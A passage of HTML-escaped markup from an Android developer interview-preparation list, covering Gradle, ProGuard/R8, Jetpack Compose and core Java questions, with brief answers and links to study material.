 &lt;li&gt; &lt;p&gt;&lt;strong&gt;16 KB page size for Android Apps&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7352176600236351489-ACm6"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the StrictMode?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/strictmode-in-android-development"&gt;StrictMode&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Lint? What is it used for?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Android App Release Checklist For The Production Launch&lt;/strong&gt; - Learn from here: &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-android-activity-7275029928692080640-HIhx"&gt;Android App Release Checklist For The Production Launch&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Git.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Firebase.&lt;/strong&gt; - &lt;a href="https://firebase.google.com/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to measure method execution time in Android?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can you access your database of SQLite Database for debugging?&lt;/strong&gt; - &lt;a href="https://github.com/amitshekhariitbhu/Android-Debug-Database"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are things that we need to take care while using Proguard?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to use Android Studio Memory Profiler?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Kotlin DSL for Gradle?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7282624364695404546-BvbS"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;implementation vs api in Gradle&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7287325379441082368-_P9m"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Gradle?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Gradle related files in Android Project&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7292045394778148864-mFVf"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you create a custom task in Gradle?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7282991795133685760-uUxE/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;annotationProcessor, kapt, ksp in Gradle&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7296566489803866112-DnT8"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Build Variants in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7298197111030824962-6vW0"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Desugaring in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7352908041224118272-JkCu"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;APK Size Reduction.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How can you speed up the Gradle build?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;About gradle build system.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;About multiple apk for Android Apps.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is ProGuard used for?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-activity-7218840466283220993-afVr"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is proguard-rules.pro file used for?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7300763237942181888-P_jL"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;ProGuard vs R8 in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7370862013998227456-tAlD"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is obfuscation? What is it used for? What about minification?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to change some parameters in an app without app update?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7288408601944043520-pHZX"&gt;Firebase Remote Config in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Write-Ahead Logging (WAL) and why it is used internally in databases?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/write-ahead-logging"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Jetpack Compose&lt;/h3&gt; 
&lt;p&gt;Topics you should know in &lt;strong&gt;Jetpack Compose&lt;/strong&gt; for Android Interview:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Compose&lt;/li&gt; 
 &lt;li&gt;State: remember, rememberSaveable, MutableState&lt;/li&gt; 
 &lt;li&gt;Recomposition&lt;/li&gt; 
 &lt;li&gt;State hoisting&lt;/li&gt; 
 &lt;li&gt;Side-effects&lt;/li&gt; 
 &lt;li&gt;Modifier&lt;/li&gt; 
 &lt;li&gt;Theme&lt;/li&gt; 
 &lt;li&gt;Layout, List&lt;/li&gt; 
 &lt;li&gt;Gestures, Animation&lt;/li&gt; 
 &lt;li&gt;CompositionLocal&lt;/li&gt; 
 &lt;li&gt;Phases&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Learn the above-mentioned from the following links:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/tutorial"&gt;Getting Started with Compose&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/mental-model"&gt;Thinking in Compose&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/state"&gt;State&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://outcomeschool.com/blog/remember-vs-remembersaveable"&gt;remember vs rememberSaveable&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/lifecycle"&gt;Lifecycle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/modifiers"&gt;Modifiers&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/side-effects"&gt;Side-effects&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-compose-jetpack-activity-7359438711530426369-IQ8S"&gt;Phases&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/semantics"&gt;Semantics&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://developer.android.com/jetpack/compose/compositionlocal"&gt;CompositionLocal&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineering-tech-activity-7235142707138961408-40hQ"&gt;Can we use traditional Android Views and Compose together?&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Questions&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Jetpack Compose vs Android View System&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the concept of declarative UI in Jetpack Compose.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Declarative UI vs Imperative UI&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Composable functions?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Recomposition?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is State in Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does state management work in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Stateful composable vs Stateless composable&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the side effects?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between LaunchedEffect and DisposableEffect&lt;/strong&gt;.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is rememberCoroutineScope and its use cases?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to observe Flows, and LiveData states in Compose UI?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How can we handle asynchronous operations in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How can we convert a non-compose state into a Compose state?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain derivedStateOf.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain rememberUpdatedState.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between remember and rememberSaveable.&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/remember-vs-remembersaveable"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the Lifecycle of a Composable in Jetpack Compose.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you handle lifecycle events in Compose functions?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the best practices for performance optimization in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can we use both Jetpack Compose and Android View in a Single App?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is State Hoisting?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain CompositionLocal&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Jetpack Compose Phases.&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-compose-jetpack-activity-7359438711530426369-IQ8S"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the role of the Modifier in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are Semantics?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How can you handle user input and events in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you handle navigation in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you handle orientation changes in Jetpack Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the concept of unidirectional data flow in Jetpack Compose.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to create Custom Layouts in Compose?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Java&lt;/h3&gt; 
&lt;p&gt;Android Interview Questions and Answers:&lt;/p&gt; 
&lt;h4&gt;Solid Principles&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;“S” in SOLID Principles: The Single Responsibility Principle&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7234425076308164611-sY57"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;"O" in SOLID Principles: Open/Closed Principle&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7287026079851061248-bjdM"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;“L” in SOLID Principles: Liskov Substitution Principle (LSP)&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-tech-activity-7300845161725448193-iCnO"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;“I” in SOLID Principles: Interface Segregation Principle (ISP)&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7301459048292397056--9bL"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;“D” in SOLID Principles: Dependency Inversion Principle (DIP)&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7303987022493270016-VrZL"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;OOP&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain OOP Concepts.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Differences between abstract classes and interfaces?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;An abstract class, is a class that contains both concrete and abstract methods (methods without implementations). An abstract method must be implemented by the abstract class sub-classes. Abstract classes cannot be instantiated and need to be extended to be used.&lt;/li&gt; 
   &lt;li&gt;An interface is like a blueprint/contract of a class (or it may be thought of as a class with methods, but without their implementation). It contains empty methods that represent, what all of its subclasses should have in common. The subclasses provide the implementation for each of these methods. Interfaces are implemented.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between method overloading and overriding.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain "String Pool" in Java&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7354122537204666368-HwxH"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the access modifiers you know? What does each one do?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;There are four access modifiers in Java language (from strictest to the most lenient): 
    &lt;ol&gt; 
     &lt;li&gt;&lt;code&gt;private&lt;/code&gt; &lt;em&gt;variables&lt;/em&gt;, &lt;em&gt;methods&lt;/em&gt;, &lt;em&gt;constructors&lt;/em&gt; or &lt;em&gt;inner classes&lt;/em&gt; are only visible to its' containing class and its' methods. This modifier is most commonly used, for example, to allow variable access only through getters and setters or to hide underlying implementation of classes that should not be used by user and therefore maintain encapsulation. Singleton constructor is also marked &lt;code&gt;private&lt;/code&gt; to avoid unwanted instantiation from outside.&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;Default&lt;/code&gt; (no keyword is used) this modifier can be applied to &lt;em&gt;classes&lt;/em&gt;, &lt;em&gt;variables&lt;/em&gt;, &lt;em&gt;constructors&lt;/em&gt; and &lt;em&gt;methods&lt;/em&gt; and allows access from classes and methods inside the same package.&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;protected&lt;/code&gt; can be used on &lt;em&gt;variables&lt;/em&gt;, &lt;em&gt;methods&lt;/em&gt; and &lt;em&gt;constructors&lt;/em&gt; therefore allowing access only to subclasses and classes that are inside the same package as protected members' class.&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;public&lt;/code&gt; modifier is widely-used on &lt;em&gt;classes&lt;/em&gt;, &lt;em&gt;variables&lt;/em&gt;, &lt;em&gt;constructors&lt;/em&gt; and &lt;em&gt;methods&lt;/em&gt; to grant access from any class and method anywhere. It should not be used everywhere as it implies that data marked with &lt;code&gt;public&lt;/code&gt; is not sensitive and can not be used to harm the program.&lt;/li&gt; 
    &lt;/ol&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can an Interface implement another Interface?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;Yes, an interface can implement another interface (and more than one), but it needs to use &lt;code&gt;extends&lt;/code&gt;, rather than &lt;code&gt;implements&lt;/code&gt; keyword. And while you can not remove methods from parent interface, you can add new ones freely to your sub-interface.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Polymorphism? What about Inheritance?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Collections and Generics&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Arrays Vs ArrayLists&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/32020000/what-is-the-difference-between-an-array-arraylist-and-a-list/32020072"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;HashSet Vs TreeSet&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/25602382/java-hashset-vs-treeset-when-should-i-use-over-other"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;HashMap Vs Set&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/2773824/difference-between-hashset-and-hashmap"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Generics in Java?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Objects and Primitives&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How is &lt;code&gt;String&lt;/code&gt; class implemented? Why was it made immutable?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt; &lt;p&gt;There is no primitive variant of &lt;code&gt;String&lt;/code&gt; class in Java language - all strings are just wrappers around underlying array of characters, which is declared &lt;code&gt;final&lt;/code&gt;. This means that, once a &lt;code&gt;String&lt;/code&gt; object is instantiated, it cannot be changed through normal tools of the language (Reflection still can mess things up horribly, because in Java no object is truly immutable). This is why &lt;code&gt;String&lt;/code&gt; variables in classes are the first candidates to be used, when you want to override &lt;code&gt;hashCode()&lt;/code&gt; and &lt;code&gt;equals()&lt;/code&gt; of your class - you can be sure, that all their required contracts will be satisfied.&lt;/p&gt; 
    &lt;blockquote&gt; 
     &lt;p&gt;Note: The String class is immutable, so that once it is created a String object cannot be changed. The String class has a number of methods, some of which will be discussed below, that appear to modify strings. Since strings are immutable, what these methods really do is create and return a new string that contains the result of the operation. (&lt;a href="https://docs.oracle.com/javase/tutorial/java/data/strings.html"&gt;Official Java Documentation&lt;/a&gt;)&lt;/p&gt; 
    &lt;/blockquote&gt; &lt;p&gt;This class is also unique in a sense, that, when you create an instance like this:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-java"&gt;String helloWorld = "Hello, World!";
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;code&gt;"Hello, World!"&lt;/code&gt; is called a &lt;em&gt;literal&lt;/em&gt; and compiler creates a &lt;code&gt;String&lt;/code&gt; object with its' value. So&lt;/p&gt; &lt;pre&gt;&lt;code class="language-java"&gt;String capital = "Hello, World!".toUpperCase();
&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;is a valid statement, that, firstly, will create an object with literal value "Hello, World!" and then will create and return another object with value "HELLO, WORLD!"&lt;/p&gt; &lt;/li&gt; 
   &lt;li&gt; &lt;p&gt;&lt;code&gt;String&lt;/code&gt; was made immutable to prevent malicious manipulation of data, when, for example, user login or other sensitive data is being send to a server.&lt;/p&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What does it means to say that a &lt;code&gt;String&lt;/code&gt; is immutable?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;It means that once created, &lt;code&gt;String&lt;/code&gt; object's &lt;code&gt;char[]&lt;/code&gt; (its' containing value) is declared &lt;code&gt;final&lt;/code&gt; and, therefore, it can not be changed during runtime.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can you list 8 primitive types in java?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;byte&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;short&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;int&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;long&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;float&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;double&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;char&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;boolean&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between an Integer and int?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;int&lt;/code&gt; is a primitive data type (with &lt;code&gt;boolean&lt;/code&gt;, &lt;code&gt;byte&lt;/code&gt;, &lt;code&gt;char&lt;/code&gt;, &lt;code&gt;short&lt;/code&gt;, &lt;code&gt;long&lt;/code&gt;, &lt;code&gt;float&lt;/code&gt; and &lt;code&gt;double&lt;/code&gt;), while &lt;code&gt;Integer&lt;/code&gt; (with &lt;code&gt;Boolean&lt;/code&gt;, &lt;code&gt;Byte&lt;/code&gt;, &lt;code&gt;Character&lt;/code&gt;, &lt;code&gt;Short&lt;/code&gt;,&lt;code&gt;Long&lt;/code&gt;, &lt;code&gt;Float&lt;/code&gt; and &lt;code&gt;Double&lt;/code&gt;) is a &lt;a href="https://docs.oracle.com/javase/tutorial/java/data/numberclasses.html"&gt;wrapper&lt;/a&gt; class that encapsulates primitive data type, while providing useful methods to perform different tasks with it.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Do objects get passed by reference or value in Java? Elaborate on that.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Java Memory Model and Garbage Collector&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;What is garbage collector? How does it work?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_java-tech-softwareengineer-activity-7308111597581799425-qZN0/"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Concurrency&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What does the keyword &lt;code&gt;synchronized&lt;/code&gt; mean?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;ThreadPoolExecutor&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/threadpoolexecutor-in-android"&gt;ThreadPoolExecutor in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;volatile&lt;/code&gt; modifier?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Object Level Lock vs Class Level Lock in Java&lt;/strong&gt; - &lt;a href="https://x.com/amitiitbhu/status/1818156936413778332"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Concurrency vs Parallelism&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineering-activity-7370752695130914816-1mxl"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;The classes in the atomic package expose a common set of methods: &lt;code&gt;get&lt;/code&gt;, &lt;code&gt;set,&lt;/code&gt;, &lt;code&gt;lazyset&lt;/code&gt;, &lt;code&gt;compareAndSet&lt;/code&gt;, and &lt;code&gt;weakCompareAndSet&lt;/code&gt;. Please describe them.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Exceptions&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the &lt;code&gt;try{}&lt;/code&gt;, &lt;code&gt;catch{}&lt;/code&gt;, &lt;code&gt;finally&lt;/code&gt; works?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between a &lt;code&gt;Checked Exception&lt;/code&gt; and an &lt;code&gt;Un-Checked Exception&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Others&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Shallow vs. Deep Copy in Java&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineering-activity-7224635014641016834-j8X1"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Serialization and Deserialization&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7371542771142373376-NbFD"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
